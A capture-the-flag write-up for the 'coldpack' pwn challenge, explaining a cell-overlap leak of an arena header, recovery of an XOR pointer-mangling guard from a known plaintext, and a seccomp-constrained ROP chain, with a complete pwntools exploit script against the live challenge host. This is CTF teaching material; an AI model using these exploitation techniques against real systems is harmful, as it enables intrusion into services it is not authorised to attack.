### Summary

coldpack's startup opens `/flag`, keeps the descriptor in the arena header, and arms a seccomp filter that only allows `read`, `write`, `close`, `fstat`, the mmap family, `exit` and `rt_sigreturn`, so the flag has to be read through the already-open fd with a ROP chain. The reaper calls `[arena+0]` after each `REAP`. Staging a run of more than six cells with the same fold bucket makes the run's last cell point at the arena header, which gives a read/write window over the header. On the live abi 1.4 head the stored reaper pointer is XOR-mangled with a per-connection guard, but its plaintext default is `kit+1`, so the guard can be recovered from the leaked header and a pivot forged.

### Steps

1. Connect to the service and allocate all 64 cells. The instance is volatile, and the banner has the form `coldpack rimefold abi <rev> ready id=<32 hex>`; the live head reports abi 1.4. `NEW` hands out cells 63 down to 0.
   ```sh
   nc 0.cloud.chals.io 15036
   ```

2. Classify the 64 cells into fold buckets. `FOLD` is a non-destructive oracle: after `STAGE a b`, `FOLD` prints `OK folded >=1` if and only if the two cells have the same canonical value (`urandom[idx] & 7`). The solver picks a representative, tests every remaining cell against it in one pipelined batch, and repeats with the leftovers. That yields about 8 buckets of roughly 8 cells each. The solver needs a bucket with at least 7 members.

3. Stage seven cells from one bucket and run `REAP`. The reaper compacts the ring and repoints the run's last cell (`victim`) to the arena base with size `0x10`. `DRAW victim 16` then leaks the 128-byte header:
   ```
   qs[0] = reaper pointer (mangled on abi 1.4)
   qs[2] = gadget kit pointer (pop rax; ret)
   qs[3] = arena base (self pointer)
   qs[4] = flag fd (observed as 5 on the live head)
   qs[5] = cookie 0x8b1e3fd7c0a64521
   ```
   ```sh
   # inside the session, after STAGE <7 cells> and REAP
   DRAW <victim> 16
   ```

4. Recover the mangling guard. On abi 1.4 the stored `qs[0]` equals `plaintext ^ guard`, where the default plaintext is `kit+1` (a bare `ret`). Hence:
   ```
   guard = qs[0] ^ (kit + 1)
   ```
   Any target `T` is requested by writing `T ^ guard`. XOR was identified with a bit-flip oracle: flipping bit `k` of `qs[0]` and running `REAP` keeps the connection alive only for `k` in {1, 2, 3, 7}. Bits 1, 2 and 3 land on `ret` or `add eax; ret` inside the kit, which matches XOR and not a rotate.

5. Build the ROP chain in a spare cell and overwrite the header. The gadget kit lies at byte deltas `0, 2, 4, 6, 8, 0xb` from `kit`: `pop rax`, `pop rdi`, `pop rsi`, `pop rdx`, `syscall`, and `mov rsp, rdi; ret`. The chain is `read(flag_fd, buf, 0x100)`, `write(1, buf, 0x100)`, `exit(0)`, where `buf` lives in another cell's data region. The chain is packed into the spare cell, and the victim header is overwritten so that `arena+0` is the pivot and `arena+8` is the chain address (XORed with the guard for `arena+0`):
   ```
   PACK <spare> <chain qwords, each as a 0x-prefixed hex value>
   PACK <victim> 0x<(kit+0xb) ^ guard> 0x<chain_addr>
   ```
   `chain_addr = arena + 0x80 + spare*0x100`.

6. Trigger `REAP`. The reaper's trailing `call [arena+0]` jumps to the pivot with `rdi = arena[1] = chain_addr`, the chain reads the flag from the fd, writes it to stdout, and exits. The solver collects the output and matches `isfcr[a-z0-9_{}]*`:
   ```sh
   python3 work/scripts/solve_live.py
   # FLAG: isfcr{REDACTED}
   ```

### Scripts

#### scripts/solve_live.py

Exploit for the live abi 1.4 head. It classifies the cells into fold buckets, leaks the header through a repointed victim cell, recovers the guard as `qs[0] ^ (kit+1)`, packs the ROP chain and the forged header, triggers `REAP` and prints the flag. Requires pwntools. Run `python3 work/scripts/solve_live.py` from the challenge directory. It opens a new connection to `0.cloud.chals.io:15036` and needs network access.

```python
#!/usr/bin/env python3
"""rimefold live (abi 1.4) exploit.

Prereqs and primitives are shared with the 1.3 bench exploit `solve.py`; this
script targets the live head, which differs in one way: the reaper funcptr in
arena header qword0 is stored XORed with a per-connection guard while the
plaintext default is `kit+1` (a `ret`). We read qword0, so guard =
qword0 ^ (kit+1); any target T is requested by writing T ^ guard.

Chain: REAP repoints a victim cell to the arena header, we PACK a ROP chain
into a spare cell, set arena.qword0 = forge(kit+0xb) (`mov rsp,rdi;ret`) and
arena.qword1 = chain, then REAP pivots and the chain does read(flagfd)+
write(1) and exits.

Run: python3 solve_live.py            (nc 0.cloud.chals.io 15036)
"""
import re
import sys
from pwn import *

context.update(arch="amd64", os="linux", log_level="info")
HOST, PORT = "0.cloud.chals.io", 15036

# Gadget kit layout as byte deltas from the `pop rax; ret` gadget (leaked via
# arena.qword2), identical to the 1.3 bench.
D_POP_RAX, D_POP_RDI, D_POP_RSI, D_POP_RDX, D_SYSCALL = 0, 2, 4, 6, 8
D_PIVOT = 0xb  # mov rsp, rdi ; ret


def exploit():
    io = remote(HOST, PORT)
    log.info("banner: %s", io.recvline().strip().decode(errors="replace"))

    def batch(lines):
        io.send(b"".join(l.encode() + b"\n" for l in lines))
        return [io.recvline().strip() for _ in lines]

    def cmd(line):
        io.sendline(line.encode())
        return io.recvline().strip()

    for r in batch(["NEW"] * 64):
        assert r.startswith(b"OK cell"), r

    # Classify the 64 cells into fold buckets (canonical = urandom[idx] & 7).
    unassigned = list(range(64))
    buckets = []
    while unassigned:
        rep = unassigned[0]
        rest = unassigned[1:]
        lines = []
        for c in rest:
            lines += [f"STAGE {rep} {c}", "FOLD"]
        resp = batch(lines)
        grp = [rep]
        left = []
        for i, c in enumerate(rest):
            (grp if int(resp[2 * i + 1].split()[-1]) >= 1 else left).append(c)
        buckets.append(grp)
        unassigned = left
    buckets.sort(key=len, reverse=True)
    run = buckets[0][:7]
    victim = run[-1]

    # REAP repoints the run's last cell to the arena base (size 0x10).
    cmd(f"STAGE {' '.join(map(str, run))}")
    cmd("REAP")
    io.sendline(f"DRAW {victim} 16".encode())
    qs = [int(x, 16) for x in io.recvline().split()[1:]]
    kit, arena, flag_fd, q0 = qs[2], qs[3], qs[4], qs[0]
    guard = q0 ^ (kit + 1)  # default plaintext is kit+1
    log.success("kit=%#x arena=%#x fd=%d guard=%#018x", kit, arena, flag_fd, guard)

    def g(delta):
        return kit + delta

    def forge(target):
        return target ^ guard

    spare = [c for c in range(64) if c != victim][0]
    bufcell = [c for c in range(64) if c != victim][1]
    chain_addr = arena + 0x80 + spare * 0x100
    buf = arena + 0x80 + bufcell * 0x100

    chain = [
        g(D_POP_RDI), flag_fd,
        g(D_POP_RSI), buf,
        g(D_POP_RDX), 0x100,
        g(D_POP_RAX), 0,          # read(flag_fd, buf, 0x100)
        g(D_SYSCALL),
        g(D_POP_RDI), 1,
        g(D_POP_RSI), buf,
        g(D_POP_RDX), 0x100,
        g(D_POP_RAX), 1,          # write(1, buf, 0x100)
        g(D_SYSCALL),
        g(D_POP_RDI), 0,
        g(D_POP_RAX), 60,         # exit(0)
        g(D_SYSCALL),
    ]
    cmd(f"PACK {spare} " + " ".join(hex(v) for v in chain))
    cmd(f"PACK {victim} {hex(forge(g(D_PIVOT)))} {hex(chain_addr)}")

    io.sendline(b"REAP")
    data = io.recvall(timeout=6)
    io.close()
    m = re.search(rb"isfcr[a-z0-9_{}]*", data)
    if m:
        log.success("FLAG: %s", m.group().decode())
        return m.group().decode()
    log.failure("flag not found; raw=%r", data)
    return None


if __name__ == "__main__":
    flag = exploit()
    sys.exit(0 if flag else 1)
```

### Notes

- The 1.3 bench build (`files/coldpack`) has a plaintext reaper pointer, so `solve.py` (not embedded here) runs the same chain without the guard step. Run locally it needs a `/flag` provider; the old local harness (`work/scratch/run/runflag.sh`) is not part of the vault any more. On the live 1.4 head that script asserts out, because `arena+0` is mangled there.
- `FOLD` reveals only bucket membership. The cell addresses are never printed.
- The arena is zero outside the header before and after `REAP`, and the reaper never copies the flag into memory. There is no data-only leak, so the flag must be read through the ROP chain.
- The guard is not derivable from the banner id, the cookie, the kit or the arena address. Guessing XOR, add, sub, rotations and two-key forms did not work. The guard is recoverable only because the default plaintext (`kit+1`) is known and its ciphertext is already in the header.
- `DRAW` and `PACK` parse numbers with base 0. Hex values need the `0x` prefix. Without it, values are parsed as decimal, which looks like `PACK` not writing.
- `recon_remote.py` (a full arena dump before and after `REAP`) was used for diagnosis and is not needed to solve.
- The live instance and its `id` are volatile. The flag is only reachable while the instance runs.
- The solver needs pwntools.
